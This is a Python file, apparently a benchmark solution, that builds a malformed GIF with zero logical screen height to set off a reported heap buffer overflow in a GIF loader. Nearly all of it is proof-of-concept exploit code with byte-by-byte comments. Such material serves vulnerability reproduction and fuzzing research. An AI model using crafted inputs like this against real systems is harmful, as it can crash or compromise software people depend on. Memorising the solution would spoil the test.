import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability (oss-fuzz:42536646) is a heap buffer overflow in the
        GIF loader. It occurs when an image with a width or height of zero is
        processed. This leads to a zero-sized memory allocation for the image
        buffer. A subsequent attempt to write even a single pixel to this buffer
        will overflow the heap.

        This PoC constructs a minimal GIF file with a Logical Screen Height of 0.
        It includes a tiny image data block to trigger the write operation that
        causes the overflow.

        Args:
            src_path: Path to the vulnerable source code tarball (not used).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        # A minimal, malformed GIF file.
        # It has a logical screen height of 0, which triggers the bug.
        
        # 1. GIF Header
        poc = b'GIF89a'
        
        # 2. Logical Screen Descriptor
        #    Width = 1, Height = 0 (vulnerable value)
        #    Packed Fields: 0x80 -> Global Color Table follows, 2 colors.
        #    Background Color Index = 0
        #    Pixel Aspect Ratio = 0
        poc += struct.pack('<HHBBB', 1, 0, 0b10000000, 0, 0)

        # 3. Global Color Table (2 colors: black and white)
        poc += b'\x00\x00\x00\xff\xff\xff'

        # 4. Image Descriptor
        #    This defines a 1x1 image frame to contain the pixel data.
        poc += b'\x2c'  # Image Separator
        #    Image Left=0, Top=0, Width=1, Height=1
        #    Packed Fields: 0x00 -> No Local Color Table, not interlaced.
        poc += struct.pack('<HHHHB', 0, 0, 1, 1, 0b00000000)

        # 5. Image Data
        #    A minimal LZW stream to write a single pixel. This is the
        #    operation that overflows the zero-sized buffer.
        poc += b'\x02'  # LZW minimum code size
        poc += b'\x01'  # Data sub-block size: 1 byte
        poc += b'\x00'  # Pixel data: color index 0
        poc += b'\x00'  # End of data sub-blocks

        # 6. GIF Trailer
        poc += b'\x3b'
        
        return poc